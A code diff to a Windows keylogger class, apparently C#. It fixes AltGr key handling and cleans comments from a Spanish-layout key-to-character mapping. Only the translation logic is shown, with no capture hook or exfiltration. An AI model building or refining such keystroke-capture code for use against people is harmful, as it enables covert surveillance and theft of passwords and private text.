@@ -78,12 +78,12 @@ class KeyLogger
             if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
                 keyState[VK_CAPITAL] = 0x01;
 
-            bool ctrl = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
-            bool alt = (GetKeyState(VK_MENU) & 0x8000) != 0;
+            bool altgr = (GetKeyState(VK_RMENU) & 0x8000) != 0;
 
-            if (ctrl && alt)
+            if (altgr)
             {
                 keyState[VK_RMENU] = 0x80;
+                keyState[VK_MENU] = 0x80;
                 keyState[VK_CONTROL] = 0x80;
             }
 
@@ -141,12 +141,12 @@ class KeyLogger
             case 27: return "[ESC]";
             case 8: return "[BACKSPACE]";
             case 32: return "[SPACE]";
-            case 222: return "´";       // Acento agudo
-            case 192: return "^";       // Circunflejo (dead key en ES)
-            case 219: return "[";       // Oem4
-            case 221: return "]";       // Oem6
-            case 220: return "\\";      // Oem5
-            case 186: return "ñ";       // Oem1 (ES layout)
+            case 222: return "´";
+            case 192: return "^";
+            case 219: return "[";
+            case 221: return "]";
+            case 220: return "\\";
+            case 186: return "ñ";
             case 187: return "=";
             case 189: return "-";
             case 188: return ",";
